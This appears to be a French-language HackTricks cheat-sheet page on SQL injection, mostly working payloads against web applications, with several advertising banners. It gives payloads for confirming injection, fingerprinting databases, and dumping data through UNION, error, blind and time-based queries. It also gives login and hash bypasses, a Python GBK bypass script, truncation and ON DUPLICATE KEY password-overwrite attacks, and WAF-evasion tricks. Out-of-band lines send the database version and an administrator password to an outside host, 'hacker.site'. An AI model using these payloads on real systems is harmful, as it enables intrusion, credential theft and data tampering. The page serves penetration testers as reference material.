# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce que l'injection SQL ?

Une **injection SQL** est une faille de s√©curit√© qui permet aux attaquants de **interf√©rer avec les requ√™tes de base de donn√©es** d'une application. Cette vuln√©rabilit√© peut permettre aux attaquants de **voir**, **modifier** ou **supprimer** des donn√©es auxquelles ils ne devraient pas avoir acc√®s, y compris des informations d'autres utilisateurs ou toute donn√©e √† laquelle l'application peut acc√©der. De telles actions peuvent entra√Æner des modifications permanentes de la fonctionnalit√© ou du contenu de l'application, voire compromettre le serveur ou provoquer un d√©ni de service.

## D√©tection des points d'entr√©e

Lorsqu'un site semble √™tre **vuln√©rable √† l'injection SQL (SQLi)** en raison de r√©ponses serveur inhabituelles aux entr√©es li√©es √† SQLi, la **premi√®re √©tape** est de comprendre comment **injecter des donn√©es dans la requ√™te sans la perturber**. Cela n√©cessite d'identifier la m√©thode pour **s'√©chapper du contexte actuel** de mani√®re efficace.  
Voici quelques exemples utiles :
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Alors, vous devez savoir comment **corriger la requ√™te afin qu'il n'y ait pas d'erreurs**. Pour corriger la requ√™te, vous pouvez **entrer** des donn√©es afin que la **requ√™te pr√©c√©dente accepte les nouvelles donn√©es**, ou vous pouvez simplement **entrer** vos donn√©es et **ajouter un symbole de commentaire √† la fin**.

_Remarque : si vous pouvez voir des messages d'erreur ou si vous pouvez rep√©rer des diff√©rences lorsque la requ√™te fonctionne et quand ce n'est pas le cas, cette phase sera plus facile._

### **Commentaires**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirmation avec des op√©rations logiques

Une m√©thode fiable pour confirmer une vuln√©rabilit√© d'injection SQL consiste √† ex√©cuter une **op√©ration logique** et √† observer les r√©sultats attendus. Par exemple, un param√®tre GET tel que `?username=Peter` produisant un contenu identique lorsqu'il est modifi√© en `?username=Peter' or '1'='1` indique une vuln√©rabilit√© d'injection SQL.

De m√™me, l'application d'**op√©rations math√©matiques** sert de technique de confirmation efficace. Par exemple, si l'acc√®s √† `?id=1` et `?id=2-1` produit le m√™me r√©sultat, cela indique une injection SQL.

Exemples d√©montrant la confirmation par op√©ration logique :
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Cette liste de mots a √©t√© cr√©√©e pour essayer de **confirmer les SQLinjections** de la mani√®re propos√©e :

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmation par le temps

Dans certains cas, vous **ne remarquerez aucun changement** sur la page que vous testez. Par cons√©quent, une bonne fa√ßon de **d√©couvrir les SQL injections aveugles** est de faire en sorte que la base de donn√©es effectue des actions qui auront un **impact sur le temps** que la page met √† charger.\
Par cons√©quent, nous allons concat√©ner dans la requ√™te SQL une op√©ration qui prendra beaucoup de temps √† compl√©ter :
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
Dans certains cas, les **fonctions sleep ne seront pas autoris√©es**. Ensuite, au lieu d'utiliser ces fonctions, vous pourriez faire en sorte que la requ√™te **effectue des op√©rations complexes** qui prendront plusieurs secondes. _Des exemples de ces techniques seront comment√©s s√©par√©ment sur chaque technologie (le cas √©ch√©ant)_.

### Identification du Back-end

La meilleure fa√ßon d'identifier le back-end est d'essayer d'ex√©cuter des fonctions des diff√©rents back-ends. Vous pourriez utiliser les _**fonctions sleep**_ de la section pr√©c√©dente ou celles-ci (tableau de [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Aussi, si vous avez acc√®s √† la sortie de la requ√™te, vous pourriez faire en sorte qu'elle **imprime la version de la base de donn√©es**.

{% hint style="info" %}
Dans la suite, nous allons discuter de diff√©rentes m√©thodes pour exploiter diff√©rents types d'injection SQL. Nous utiliserons MySQL comme exemple.
{% endhint %}

### Identification avec PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Exploitation bas√©e sur Union

### D√©tection du nombre de colonnes

Si vous pouvez voir la sortie de la requ√™te, c'est le meilleur moyen de l'exploiter.\
Tout d'abord, nous devons d√©couvrir le **nombre** de **colonnes** que la **requ√™te initiale** renvoie. Cela est d√ª au fait que **les deux requ√™tes doivent renvoyer le m√™me nombre de colonnes**.\
Deux m√©thodes sont g√©n√©ralement utilis√©es √† cet effet :

#### Order/Group by

Pour d√©terminer le nombre de colonnes dans une requ√™te, ajustez progressivement le nombre utilis√© dans les clauses **ORDER BY** ou **GROUP BY** jusqu'√† ce qu'une r√©ponse fausse soit re√ßue. Malgr√© les fonctionnalit√©s distinctes de **GROUP BY** et **ORDER BY** dans SQL, les deux peuvent √™tre utilis√©s de mani√®re identique pour d√©terminer le nombre de colonnes de la requ√™te.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

S√©lectionnez de plus en plus de valeurs nulles jusqu'√† ce que la requ√™te soit correcte :
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Vous devriez utiliser des valeurs `null` car dans certains cas, le type des colonnes des deux c√¥t√©s de la requ√™te doit √™tre le m√™me et null est valide dans tous les cas._

### Extraire les noms de bases de donn√©es, les noms de tables et les noms de colonnes

Dans les exemples suivants, nous allons r√©cup√©rer le nom de toutes les bases de donn√©es, le nom de la table d'une base de donn√©es, les noms des colonnes de la table :
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Il existe une m√©thode diff√©rente pour d√©couvrir ces donn√©es sur chaque base de donn√©es diff√©rente, mais la m√©thodologie reste toujours la m√™me._

## Exploiting Hidden Union Based

Lorsque la sortie d'une requ√™te est visible, mais qu'une injection bas√©e sur un union semble inatteignable, cela signifie la pr√©sence d'une **injection bas√©e sur un union cach√©**. Ce sc√©nario conduit souvent √† une situation d'injection aveugle. Pour transformer une injection aveugle en une injection bas√©e sur un union, il est n√©cessaire de discerner la requ√™te d'ex√©cution sur le backend.

Cela peut √™tre accompli gr√¢ce √† l'utilisation de techniques d'injection aveugle ainsi qu'aux tables par d√©faut sp√©cifiques √† votre Syst√®me de Gestion de Base de Donn√©es (SGBD) cible. Pour comprendre ces tables par d√©faut, il est conseill√© de consulter la documentation du SGBD cible.

Une fois la requ√™te extraite, il est n√©cessaire d'adapter votre charge utile pour fermer en toute s√©curit√© la requ√™te originale. Ensuite, une requ√™te union est ajout√©e √† votre charge utile, facilitant l'exploitation de l'injection bas√©e sur un union nouvellement accessible.

Pour des informations plus compl√®tes, consultez l'article complet disponible √† [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Exploiting Error based

Si pour une raison quelconque vous **ne pouvez pas** voir la **sortie** de la **requ√™te** mais que vous pouvez **voir les messages d'erreur**, vous pouvez utiliser ces messages d'erreur pour **ex-filtrer** des donn√©es de la base de donn√©es.\
En suivant un flux similaire √† celui de l'exploitation bas√©e sur un union, vous pourriez r√©ussir √† vider la base de donn√©es.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploiter le Blind SQLi

Dans ce cas, vous ne pouvez pas voir les r√©sultats de la requ√™te ou les erreurs, mais vous pouvez **distinguer** quand la requ√™te **renvoie** une r√©ponse **vraie** ou **fausse** car il y a diff√©rents contenus sur la page.\
Dans ce cas, vous pouvez abuser de ce comportement pour extraire la base de donn√©es caract√®re par caract√®re :
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploiter l'Error Blind SQLi

C'est le **m√™me cas que pr√©c√©demment** mais au lieu de distinguer entre une r√©ponse vraie/faux de la requ√™te, vous pouvez **distinguer entre** une **erreur** dans la requ√™te SQL ou non (peut-√™tre parce que le serveur HTTP plante). Par cons√©quent, dans ce cas, vous pouvez forcer une SQLerror chaque fois que vous devinez correctement le caract√®re :
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploiter les SQLi Bas√©s sur le Temps

Dans ce cas, il **n'y a pas** de moyen de **distinguer** la **r√©ponse** de la requ√™te en fonction du contexte de la page. Mais, vous pouvez faire en sorte que la page **prenne plus de temps √† charger** si le caract√®re devin√© est correct. Nous avons d√©j√† vu cette technique utilis√©e auparavant pour [confirmer une vuln√©rabilit√© SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Requ√™tes Empil√©es

Vous pouvez utiliser des requ√™tes empil√©es pour **ex√©cuter plusieurs requ√™tes √† la suite**. Notez que bien que les requ√™tes suivantes soient ex√©cut√©es, les **r√©sultats** ne sont **pas renvoy√©s √† l'application**. Par cons√©quent, cette technique est principalement utile en relation avec des **vuln√©rabilit√©s aveugles** o√π vous pouvez utiliser une seconde requ√™te pour d√©clencher une recherche DNS, une erreur conditionnelle ou un d√©lai.

**Oracle** ne prend pas en charge les **requ√™tes empil√©es.** **MySQL, Microsoft** et **PostgreSQL** les prennent en charge : `QUERY-1-HERE; QUERY-2-HERE`

## Exploitation Hors Bande

Si **aucune autre** m√©thode d'exploitation **n'a fonctionn√©**, vous pouvez essayer de faire en sorte que la **base de donn√©es exfiltre** les informations vers un **h√¥te externe** contr√¥l√© par vous. Par exemple, via des requ√™tes DNS :
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltration de donn√©es hors bande via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Exploitation Automatis√©e

Consultez la [SQLMap Cheatsheet](sqlmap/) pour exploiter une vuln√©rabilit√© SQLi avec [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informations sp√©cifiques √† la technologie

Nous avons d√©j√† discut√© de toutes les fa√ßons d'exploiter une vuln√©rabilit√© d'injection SQL. Trouvez quelques astuces suppl√©mentaires d√©pendantes de la technologie de base de donn√©es dans ce livre :

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ou vous trouverez **beaucoup d'astuces concernant : MySQL, PostgreSQL, Oracle, MSSQL, SQLite et HQL dans** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Contournement d'authentification

Liste √† essayer pour contourner la fonctionnalit√© de connexion :

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Contournement d'authentification par hachage brut
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Cette requ√™te met en √©vidence une vuln√©rabilit√© lorsque MD5 est utilis√© avec true pour la sortie brute dans les v√©rifications d'authentification, rendant le syst√®me susceptible √† l'injection SQL. Les attaquants peuvent exploiter cela en cr√©ant des entr√©es qui, lorsqu'elles sont hach√©es, produisent des parties de commandes SQL inattendues, conduisant √† un acc√®s non autoris√©.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### Contournement de l'authentification par hachage inject√©
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Liste recommand√©e**:

Vous devriez utiliser comme nom d'utilisateur chaque ligne de la liste et comme mot de passe toujours : _**Pass1234.**_\
_(Ces payloads sont √©galement inclus dans la grande liste mentionn√©e au d√©but de cette section)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### Contournement d'authentification GBK

SI ' est √©chapp√©, vous pouvez utiliser %A8%27, et lorsque ' est √©chapp√©, il sera cr√©√© : 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Script Python :
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Injection polyglotte (multicontexte)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Modifier le mot de passe d'un objet/utilisateur existant

Pour ce faire, vous devriez essayer de **cr√©er un nouvel objet nomm√© comme le "objet ma√Ætre"** (probablement **admin** dans le cas des utilisateurs) en modifiant quelque chose :

* Cr√©er un utilisateur nomm√© : **AdMIn** (lettres majuscules et minuscules)
* Cr√©er un utilisateur nomm√© : **admin=**
* **SQL Truncation Attack** (lorsqu'il y a une sorte de **limite de longueur** dans le nom d'utilisateur ou l'email) --> Cr√©er un utilisateur avec le nom : **admin \[beaucoup d'espaces] a**

#### SQL Truncation Attack

Si la base de donn√©es est vuln√©rable et que le nombre max de caract√®res pour le nom d'utilisateur est par exemple 30 et que vous souhaitez usurper l'identit√© de l'utilisateur **admin**, essayez de cr√©er un nom d'utilisateur appel√© : "_admin \[30 espaces] a_" et n'importe quel mot de passe.

La base de donn√©es va **v√©rifier** si le **nom d'utilisateur** introduit **existe** dans la base de donn√©es. Si **non**, elle va **couper** le **nom d'utilisateur** au **nombre max de caract√®res autoris√©s** (dans ce cas √† : "_admin \[25 espaces]_") et elle va **automatiquement supprimer tous les espaces √† la fin en mettant √† jour** dans la base de donn√©es l'utilisateur "**admin**" avec le **nouveau mot de passe** (une erreur pourrait appara√Ætre mais cela ne signifie pas que cela n'a pas fonctionn√©).

Plus d'infos : [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Note : Cette attaque ne fonctionnera plus comme d√©crit ci-dessus dans les derni√®res installations de MySQL. Bien que les comparaisons ignorent toujours les espaces de fin par d√©faut, tenter d'ins√©rer une cha√Æne qui est plus longue que la longueur d'un champ entra√Ænera une erreur, et l'insertion √©chouera. Pour plus d'informations √† ce sujet, consultez : [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### V√©rification bas√©e sur le temps d'insertion MySQL

Ajoutez autant de `','',''` que vous le jugez n√©cessaire pour sortir de l'instruction VALUES. Si un d√©lai est ex√©cut√©, vous avez une SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

La clause `ON DUPLICATE KEY UPDATE` dans MySQL est utilis√©e pour sp√©cifier les actions que la base de donn√©es doit entreprendre lorsqu'une tentative est faite d'ins√©rer une ligne qui entra√Ænerait une valeur dupliqu√©e dans un index UNIQUE ou une CL√â PRIMAIRE. L'exemple suivant d√©montre comment cette fonctionnalit√© peut √™tre exploit√©e pour modifier le mot de passe d'un compte administrateur :

Exemple de charge utile d'injection :

Une charge utile d'injection pourrait √™tre con√ßue comme suit, o√π deux lignes sont tent√©es d'√™tre ins√©r√©es dans la table `users`. La premi√®re ligne est un leurre, et la deuxi√®me ligne cible l'email d'un administrateur existant dans l'intention de mettre √† jour le mot de passe :
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Voici comment cela fonctionne :

- La requ√™te tente d'ins√©rer deux lignes : une pour `generic_user@example.com` et une autre pour `admin_generic@example.com`.
- Si la ligne pour `admin_generic@example.com` existe d√©j√†, la clause `ON DUPLICATE KEY UPDATE` se d√©clenche, demandant √† MySQL de mettre √† jour le champ `password` de la ligne existante √† "bcrypt_hash_of_newpassword".
- Par cons√©quent, l'authentification peut ensuite √™tre tent√©e en utilisant `admin_generic@example.com` avec le mot de passe correspondant au hash bcrypt ("bcrypt_hash_of_newpassword" repr√©sente le hash bcrypt du nouveau mot de passe, qui doit √™tre remplac√© par le hash r√©el du mot de passe souhait√©).

### Extraire des informations

#### Cr√©ation de 2 comptes en m√™me temps

Lors de la tentative de cr√©ation d'un nouvel utilisateur, un nom d'utilisateur, un mot de passe et un e-mail sont n√©cessaires :
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Utilisation de d√©cimal ou hexad√©cimal

Avec cette technique, vous pouvez extraire des informations en cr√©ant seulement 1 compte. Il est important de noter que vous n'avez besoin de commenter quoi que ce soit.

Utilisation de **hex2dec** et **substr** :
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Pour obtenir le texte, vous pouvez utiliser :
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Utiliser **hex** et **replace** (et **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Injection SQL rout√©e

L'injection SQL rout√©e est une situation o√π la requ√™te injectable n'est pas celle qui donne un r√©sultat, mais la sortie de la requ√™te injectable va √† la requ√™te qui donne un r√©sultat. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Exemple :
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Contournement WAF

[Contournements initiaux ici](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Contournement sans espaces

Pas d'espace (%20) - contournement utilisant des alternatives d'espacement
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
Aucun espace - contournement en utilisant des commentaires
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - contourner en utilisant des parenth√®ses
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

Pas de virgules - contournement utilisant OFFSET, FROM et JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Bypasses g√©n√©riques

Liste noire utilisant des mots-cl√©s - contournement en utilisant des majuscules/minuscules
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist utilisant des mots-cl√©s insensible √† la casse - contournement en utilisant un op√©rateur √©quivalent
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Contournement WAF par notation scientifique

Vous pouvez trouver une explication plus approfondie de cette astuce dans le [blog gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Fondamentalement, vous pouvez utiliser la notation scientifique de mani√®re inattendue pour contourner le WAF :
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Contourner la restriction des noms de colonnes

Tout d'abord, notez que si la **requ√™te originale et la table dont vous souhaitez extraire le drapeau ont le m√™me nombre de colonnes**, vous pouvez simplement faire : `0 UNION SELECT * FROM flag`

Il est possible d'**acc√©der √† la troisi√®me colonne d'une table sans utiliser son nom** en utilisant une requ√™te comme suit : `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, donc dans une sqlinjection, cela ressemblerait √† :
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ou en utilisant un **bypass de virgule** :
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ce truc a √©t√© pris de [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Outils de suggestion de contournement WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Autres Guides

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Liste de D√©tection de Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
